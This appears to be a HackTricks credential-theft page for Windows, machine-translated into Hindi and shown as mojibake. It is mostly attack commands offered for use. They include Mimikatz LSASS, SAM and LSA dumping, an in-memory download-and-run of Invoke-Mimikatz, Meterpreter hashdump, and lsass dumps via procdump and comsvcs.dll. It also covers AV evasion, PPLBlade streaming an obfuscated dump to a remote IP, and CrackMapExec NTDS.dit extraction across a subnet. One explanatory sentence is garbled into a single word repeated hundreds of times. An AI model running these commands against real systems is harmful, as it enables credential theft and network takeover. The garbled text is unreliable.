# Windows Credentials рдЪреБрд░рд╛рдирд╛

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **Twitter** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**рдЗрд╕ рдкреГрд╖реНрда рдореЗрдВ Mimikatz рдХреЗ рдЕрдиреНрдп рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдЦреЛрдЬреЗрдВ** [**рдЗрд╕ рдкреГрд╖реНрда рдореЗрдВ**](credentials-mimikatz.md)**ред**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**рдХреБрдЫ рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕рдВрд░рдХреНрд╖рдг рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдиреЗрдВред**](credentials-protections.md) **рдпрд╣ рд╕рдВрд░рдХреНрд╖рдг рдХреБрдЫ рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рд╕реЗ рд░реЛрдХ рд╕рдХрддрд╛ рд╣реИред**

## Meterpreter рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгрдкрддреНрд░

рдЙрд╕ [**рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд▓рдЧрдЗрди**](https://github.com/carlospolop/MSF-Credentials) **рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ** рдЬрд┐рд╕реЗ **рдореИрдВрдиреЗ рдмрдирд╛рдпрд╛ рд╣реИ** рддрд╛рдХрд┐ рдЖрдк рдкреАрдбрд╝рд┐рдд рдореЗрдВ **рдкрд╛рд╕рд╡рд░реНрдб рдФрд░ рд╣реИрд╢** рдЦреЛрдЬ рд╕рдХреЗрдВред
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV рдХреЛ рдЫрд▓рдирд╛

### Procdump + Mimikatz

рдЬреИрд╕рд╛ рдХрд┐ **[SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)** рд╕реЗ **Procdump** рдПрдХ рд╡реИрдз Microsoft рдЙрдкрдХрд░рдг рд╣реИ, рдЗрд╕реЗ Defender рджреНрд╡рд╛рд░рд╛ рдкрд╣рдЪрд╛рдирд╛ рдирд╣реАрдВ рдЬрд╛рддрд╛ рд╣реИред\
рдЖрдк рдЗрд╕ рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **lsass рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, **рдбрдВрдк рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ **рдбрдВрдк рд╕реЗ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдкреНрд░рдорд╛рдг рдкрддреНрд░** рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред

{% code title="lsass рдХрд╛ рдбрдВрдк" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% endcode %}

{% code title="рдбрдВрдк рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдирд┐рдХрд╛рд▓реЗрдВ" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ [SprayKatz](https://github.com/aas-n/spraykatz) рдХреЗ рд╕рд╛рде рдХреА рдЬрд╛рддреА рд╣реИ: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**рдзреНрдпрд╛рди рджреЗрдВ**: рдХреБрдЫ **AV** рдХреБрдЫ **рд╣рд╛рдирд┐рдХрд╛рд░рдХ** рдорд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **procdump.exe рдХрд╛ рдЙрдкрдпреЛрдЧ lsass.exe рдХреЛ рдбрдВрдк рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП, рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ **"procdump.exe" рдФрд░ "lsass.exe"** рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ **рдкрд╣рдЪрд╛рди** рд░рд╣реЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП **lsass.exe рдХрд╛ PID** procdump рдХреЛ **рдирд╛рдо lsass.exe рдХреЗ рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **рдмрдЬрд╛рдп** **
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**рдЖрдк рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ** [**lssasy**](https://github.com/Hackndo/lsassy)** рдХреЗ рд╕рд╛рде рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**

### **рдЯрд╛рд╕реНрдХ рдореИрдиреЗрдЬрд░ рдХреЗ рд╕рд╛рде lsass рдХреЛ рдбрдВрдк рдХрд░рдирд╛**

1. рдЯрд╛рд╕реНрдХ рдмрд╛рд░ рдкрд░ рд░рд╛рдЗрдЯ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ рдЯрд╛рд╕реНрдХ рдореИрдиреЗрдЬрд░ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ
2. рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ
3. рдкреНрд░реЛрд╕реЗрд╕ рдЯреИрдм рдореЗрдВ "рд╕реНрдерд╛рдиреАрдп рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛" рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
4. "рд╕реНрдерд╛рдиреАрдп рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛" рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдкрд░ рд░рд╛рдЗрдЯ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ "рдбрдВрдк рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдПрдВ" рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред

### procdump рдХреЗ рд╕рд╛рде lsass рдХреЛ рдбрдВрдк рдХрд░рдирд╛

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) рдПрдХ Microsoft рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдмрд╛рдЗрдирд░реА рд╣реИ рдЬреЛ [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) рд╕реБрдЗрдЯ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИред
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade рдХреЗ рд╕рд╛рде lsass рдХреЛ рдбрдВрдк рдХрд░рдирд╛

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдбрдВрдкрд┐рдВрдЧ рдЯреВрд▓ рд╣реИ рдЬреЛ рдореЗрдореЛрд░реА рдбрдВрдк рдХреЛ рдЕрд╕реНрдкрд╖реНрдЯ рдХрд░рдиреЗ рдФрд░ рдЗрд╕реЗ рдбрд┐рд╕реНрдХ рдкрд░ рдЫреЛрдбрд╝реЗ рдмрд┐рдирд╛ рд░рд┐рдореЛрдЯ рд╡рд░реНрдХрд╕реНрдЯреЗрд╢рди рдкрд░ рдЯреНрд░рд╛рдВрд╕рдлрд░ рдХрд░рдиреЗ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред

**рдореБрдЦреНрдп рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛рдПрдБ**:

1. PPL рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЫрд▓рдХрд░рдирд╛
2. Defender рд╣рд╕реНрддрд╛рдХреНрд╖рд░-рдЖрдзрд╛рд░рд┐рдд рдкрд╣рдЪрд╛рди рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдореЗрдореЛрд░реА рдбрдВрдк рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдЕрд╕реНрдкрд╖реНрдЯ рдХрд░рдирд╛
3. рдбрд┐рд╕реНрдХ рдкрд░ рди рдЫреЛрдбрд╝реЗ рдмрд┐рдирд╛ рдореЗрдореЛрд░реА рдбрдВрдк рдХреЛ RAW рдФрд░ SMB рдЕрдкрд▓реЛрдб рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдЕрдкрд▓реЛрдб рдХрд░рдирд╛ (рдлрд╛рдЗрд▓рд▓реЗрд╕ рдбрдВрдк)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## CrackMapExec

### SAM рд╣реИрд╢ рдбрдВрдк
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдбрдВрдк рдХрд░реЗрдВ
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### рд▓рдХреНрд╖реНрдп DC рд╕реЗ NTDS.dit рдбрдВрдк рдХрд░реЗрдВ
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### рд▓рдХреНрд╖реНрдп DC рд╕реЗ NTDS.dit рдкрд╛рд╕рд╡рд░реНрдб рд╣рд┐рд╕реНрдЯреНрд░реА рдбрдВрдк рдХрд░реЗрдВ
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
